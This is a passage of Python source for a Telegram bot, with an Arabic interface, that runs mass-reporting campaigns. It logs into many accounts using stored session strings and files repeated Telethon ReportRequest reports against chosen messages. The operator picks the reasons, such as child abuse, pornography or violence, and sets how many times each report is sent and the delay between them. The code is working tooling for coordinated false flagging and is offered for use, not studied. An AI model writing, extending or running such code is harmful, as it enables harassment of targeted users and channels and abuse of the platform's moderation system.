@bot.callback_query_handler(func=lambda call: call.data.startswith("report_"))
def set_report_type(call):
    report_key = call.data.replace("report_", "")
    settings = get_settings()
    settings["report_type"] = report_key
    save_settings(settings)
    names = {
        "child": "👶 إساءة للأطفال",
        "porn": "🔞 إباحي",
        "violence": "💥 عنف",
        "weapons": "🔫 أسلحة",
        "drugs": "💊 مخدرات",
        "personal": "🔒 بيانات خاصة"
    }
    bot.answer_callback_query(call.id, f"✅ تم اختيار: {names.get(report_key, '')}")
    bot.edit_message_text(f"✅ **تم تعيين نوع البلاغ:**\n{names.get(report_key, '')}", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "start_report")
def start_report(call):
    global is_reporting
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    accounts = get_user_accounts(call.from_user.id)
    messages = get_messages()
    if not accounts or not messages:
        bot.answer_callback_query(call.id, "❌ لا يوجد حسابات أو رسائل")
        return
    if is_reporting:
        bot.answer_callback_query(call.id, "⚠️ الإبلاغ يعمل بالفعل")
        return
    is_reporting = True
    bot.edit_message_text("▶️ **بدء الإبلاغ...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    threading.Thread(target=run_reporting, args=(call.message.chat.id, call.from_user.id)).start()

def run_reporting(chat_id, user_id):
    global is_reporting
    accounts = get_user_accounts(user_id)
    messages = get_messages()
    settings = get_settings()
    report_count = settings.get('report_count', 1)
    sleep_time = settings.get('sleep_time', 5)
    comment = settings.get('comment', '')
    report_type_map = {
        "child": tltypes.InputReportReasonChildAbuse(),
        "porn": tltypes.InputReportReasonPornography(),
        "violence": tltypes.InputReportReasonViolence(),
        "weapons": tltypes.InputReportReasonSpam(),
        "drugs": tltypes.InputReportReasonSpam(),
        "personal": tltypes.InputReportReasonOther()
    }
    reason = report_type_map.get(settings.get('report_type', 'child'), tltypes.InputReportReasonOther())
    total = len(accounts) * len(messages) * report_count
    safe_send_message(chat_id, f"📊 **عدد الإبلاغات الكلي:** {total}")
    for acc in accounts:
        if not is_reporting:
            break
        session_str = acc.get('session')
        if not session_str:
            continue
        try:
            client = TelegramClient(f"report_{acc.get('random_name','')}", API_ID, API_HASH, session_string=session_str)
            async def report():
                await client.connect()
                for msg in messages:
                    if not is_reporting:
                        break
                    for _ in range(report_count):
                        if not is_reporting:
                            break
                        try:
                            entity = await client.get_entity(msg.get('chat'))
                            await client(functions.messages.ReportRequest(
                                peer=entity,
                                id=[msg.get('message_id')],
                                reason=reason,
                                message=comment
                            ))
                            # تحديث الإحصائيات
                            accounts = get_user_accounts(user_id)
                            for a in accounts:
                                if a.get('phone') == acc.get('phone'):
                                    a['reports_count'] = a.get('reports_count', 0) + 1
                                    a['success_reports'] = a.get('success_reports', 0) + 1
                                    a['last_used'] = datetime.now().strftime("%Y-%m-%d %H:%M")
                                    save_user_accounts(user_id, accounts)
                                    break
                            safe_send_message(chat_id, f"✅ بلاغ نجح: {msg.get('link')}")
                        except Exception as e:
                            # تحديث الفشل
                            accounts = get_user_accounts(user_id)
                            for a in accounts:
                                if a.get('phone') == acc.get('phone'):
                                    a['reports_count'] = a.get('reports_count', 0) + 1
                                    a['failed_reports'] = a.get('failed_reports', 0) + 1
                                    save_user_accounts(user_id, accounts)
                                    break
                            safe_send_message(chat_id, f"❌ خطأ: {str(e)[:100]}")
                        time.sleep(sleep_time)
                await client.disconnect()
            run_async(report())
        except Exception as e:
            safe_send_message(chat_id, f"❌ خطأ في الحساب: {e}")
    is_reporting = False
    safe_send_message(chat_id, "✅ **انتهى الإبلاغ**")

@bot.callback_query_handler(func=lambda call: call.data == "stop_report")
def stop_report(call):
    global is_reporting
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    is_reporting = False
    bot.edit_message_text("⏹️ **تم إيقاف الإبلاغ**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "status")
def show_status(call):
    if is_reporting:
        status_text = "🟢 **يعمل**"
    else:
        status_text = "🔴 **متوقف**"
    bot.edit_message_text(f"📊 **الحالة:**\n{status_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def admin_stats(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    accounts = get_user_accounts(OWNER_ID)
    messages = get_messages()
    users = load_json("users.json")
    admins = load_json("admins.json")
    text = f"📊 **إحصائيات:**\n👤 المالك: `{OWNER_ID}`\n🔑 الأدمن: {len(admins)}\n👥 المستخدمين: {len(users)}\n📱 الحسابات: {len(accounts)}\n💬 الرسائل: {len(messages)}"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_reset")
def admin_reset(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    for file in ["accounts.json", "messages.json", "settings.json", "users.json", "admins.json", "sessions.json"]:
        if os.path.exists(file):
            os.remove(file)
    bot.edit_message_text("✅ **تم مسح كل البيانات**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_report")
def admin_report(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    accounts = get_user_accounts(OWNER_ID)
    text = "📋 **تقرير:**\n"
    for acc in accounts:
        text += f"📱 {acc.get('phone')} - {acc.get('reports_count', 0)} بلاغ\n"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main(call):
    main_menu(call.message.chat.id, call.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_admin")
def back_to_admin(call):
    admin_panel(call.message)

# ========== تشغيل البوت ==========
print("🤖 البوت شغال...")
print(f"👤 المالك: {OWNER_ID}")
print(f"📦 Telethon: {'✅ متاح' if TELETHON_AVAILABLE else '❌ غير متاح'}")
print(f"⚙️ API_ID: {API_ID}")
bot.infinity_polling()
